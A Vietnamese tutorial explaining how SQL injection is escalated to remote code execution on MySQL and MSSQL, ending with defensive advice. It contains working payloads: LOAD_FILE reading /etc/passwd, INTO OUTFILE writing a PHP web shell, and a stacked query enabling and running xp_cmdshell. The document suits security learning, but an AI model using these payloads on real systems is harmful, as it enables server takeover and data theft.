# SQL-Injection-to-RCE

# 1.Khái niệm

Đây cũng chỉ là một kĩ thuật SQL Injection khác thôi . 

Nhưng khác với các kỹ thuật khai thác còn lại chỉ có thể đọc được dữ liệu ở trong database , kỹ thuật này nó còn có thể chiếm quyền điều khiển máy chủ , thực hiện ghi File và thực thi lệnh trực tiếp 

# 2. Kỹ thuật và điều kiện để khai thác 

Ở đây chúng ta cần 3 điều kiến chính đó chính là 

- khi quyền kết nối web app với database phải là `root` hoặc `sa` chứ không được là `user`
- Cho phép thực thi nhiều câu lệnh đối với MSSQL , còn MYSQL không cần điều kiện này
- Điều kiện cuối là , đối với MYSQL thì biến `secure_file_priv` phải là rỗng để có thể cho phép đọc file , ghi file trực tiếp vào ổ cứng hệ thống . Đối với MSSQL thì cái file thư viện `xplog70.dll` nó không được xóa , bởi vì đó là cái thư viện hỗ trợ cho chức năng sử dụng các câu lệnh cmd dành cho SQL 

# 2.0 Sử dụng hàm LOAD_FILE() ĐỐI VỚI MYSQL

Ví dụ cho các bạn dễ hình dung ra thì hàm này nó có có thể đọc các file trong cả hệ thống miễn là tài khoản kết nối tới database có quyền đọc file đó và cấu hình của database cho phép
```sql
SELECT LOAD_FILE('Đường_dẫn_tới_file');
```
Giả sử khi chúng ta SQL Injection URL thế này 
```
http://shop.com/index.php?id=10000 UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --
```
Thì thứ hiện ra  không phải là thông tin sản phẩm nữa mà chính là thông tin file cấu hình của hệ thống

# 2.1. SỬ DỤNG INTO OUTFILE ĐỐI VỚI MYSQL 

Thứ nhất là quyền `root` hoặc `sa`. Giải thích dễ hiểu thì các bạn cứ hiểu thế này . Giả sử trong backend sẽ có đoạn này
```sql
$nameservice = "db-blind-sqli";
$username = "user";
$password = "123456";
$dbname = "blind_sqli_db";
```
Ở dòng `$username` đó , mỗi khi bạn vào trang web với quyền là một người dùng , thì cái username đó luôn luôn là user . Cái này ảnh hưởng đến quyền của bạn có thể sử dụng những câu lệnh với Database . 

Nhưng ở đây bạn phải phân biệt , bạn đăng nhập ở web nó khác với cái mà code web của bạn kết nối với Database . Với quyền user khi kết nối tới database thì Database nó chỉ cho code web của bạn gửi những câu lệnh chứa giả sử như `UNION` , `SELECT` , ... CÒn khi gửi những lệnh mà chứa các từ như `INTO OUT FILE` kia thì Database sẽ chặn ngay 

Vậy thì cái đầu tiên cần để có thể thực thi RCE được chính là `backend` nó set up là `$username = "root"` 

Tiếp tục , khi đã có quyền `root` kết nối với database thì Điều kiện cần tiếp theo đó chính là: 

Với quyền root đó , cũng cần phải có quyền để ghi file vào thư mục Web bởi vì không hẳn có root là có thể làm tất cả 

Giống như lúc nãy khi ta sử dụng 
```sql
SELECT "<?php system($_GET['cmd']"; ?>" INTO OUT FILE 'var/www/html/shell.php'
```
Chúng ta sẽ không thể chèn file `shell.php` kia vào trong thư mục `var/www/html` được nếu mà không có quyền root và không có quyền khi đè file vào thư mục Web

Đấy là đối với hệ quản trị cơ sở dữ liệu MySQL . 

# 2.2. SỬ DỤNG XP_CMDSHELL ĐỐI VỚI MSSQL 

Đối với hệ quản trị cơ sở dữ liệu MSSQL , thì lệnh để thực thi RCE nó sẽ là 

```
EXEC xp_cmdshell 'cmd'
```
Chúng ta không thể sử dụng UNION SELECT EXEC xp_cmdshell như thế được . Vì thể chúng ta cần phải sử dụng dấu chấm phẩy `;` để có thể thực thi nhiều câu truy vấn cùng một lúc

Nhưng vấn đề là chúng ta cần backend nó cho phép gửi nhiều câu truy vấn cùng một lúc 


Giải thích một số lệnh cơ bản
```
EXEC: viết tắt(exacute): chức năng chạy chương trình 
DELACRE: khai báo biến 
SET: nó giống như gán ( sau khi khai báo biến bằng DELACRE thì chúng ta phải dùng SET để gán)
```

quy trình để RCE thực tế trên MSSQL

Bật mode cấu hình nâng cao để chỉnh sửa các tính năng ẩn 
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```
Bật xp_cmdshell
```sql
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```
Thực thi lệnh RCE . Bây giờ chạy bất kì lệnh cmd nào
```sql
EXEC xp_cmdshell 'whoami';
```

Giả sử ,bạn có một website `shop.com`

Với chức năng lấy thông tin sản phẩm bằng tham số id . Câu truy vấn thực hiện
```sql
SELECT * FROM products WHERE id = 1
```
Nhưng nếu chúng ta không nhập vào tham số id là 1 mà nhập vào là
```sql
1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; EXEC xp_cmdshell 'whoami';
```
Bởi vì web cho thực hiện việc gửi nhiều truy vấn một lúc , cho nên khi vào trong DATABASE thì thực tế sẽ là
```sql
SELECT * FROM products WHERE id =1;
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
Kết quả khi đến dòng whoami kia thì tự động bật chương trình `cmd.exe` kia lên vào thực thi lệnh whoami . Kết quả nhận được thì SQL sẽ đưa vào một bảng riêng và trả về Client 

# 2.3. Nạp lại file xplog70.dll đối với MSSQL

Như đã nói trên thì muốn thực hiện SQLi to RCE thì bắt buộc phải dùng tới xp_cmdshell đối với MSSQL , nhưng 

Khi mà file `xplog70.dll` bị xóa đi thì lệnh xp_cmdshell cũng trở nên vô tác dụng , bởi vì thư viện hỗ trợ nó đã bị xóa đi rồi mà

Giải pháp ở đây chúng ta có thể tự tạo lại file đó rồi nạp lại cũng được mà trường hợp ở đây backend nó phải hỗ trợ thực thi nhiều lệnh một lúc và tài khoản kết nối tới SQL phải có quyền ghi File vào một thư mục trên hệ điều hành 

Sau khi tạo lại đườ file `xplog70.dll` rồi thì chúng ta cần ghi file xuống ổ cứng . Ở đây thì chúng ta phải sử dụng OLE Automation . Nói dễ hiểu thì nó là một chức năng cho phép SQL Server điều khiển window của bạn , có thể tự động bật execl hoặc bật cmd lên này nọ ,... (các bạn tự tìm hiểu thêm về cái chức năng này thêm )

Rồi tiếp tục khi đã nạp được file vào hệ thống rồi thì chúng ta sử dụng lại cái `xp_cmdshell` thôi


# 3.Cách phòng chống 

- Sử dụng Prepared Statement cho mọi truy vấn của Database . Không được nối chuỗi

- Với người dùng thì web app chỉ được kết nối tới database với user thường , chỉ có quyền sử dụng `UNION`, `SELECT` , `UPDATE` ,...Tuyệt đối không được set là `root` hay `sa`

- Tắt `xp_cmdshell`, `OLE_Autonmation`

- Xóa các thư viện `.dll` nhạy cảm không dùng đến đối với MSSQL

- Sử dụng WAF để chặn các từ khóa như UNION,SELECT,... nếu phát hiện nó trong input nhập vào

- Set `secure_file_priv` = NULL bởi vì cái mode này chính là việc quyết định không cho đọc file(LOAD_FILE) hoặc ghi đề file vào trong ổ cứng


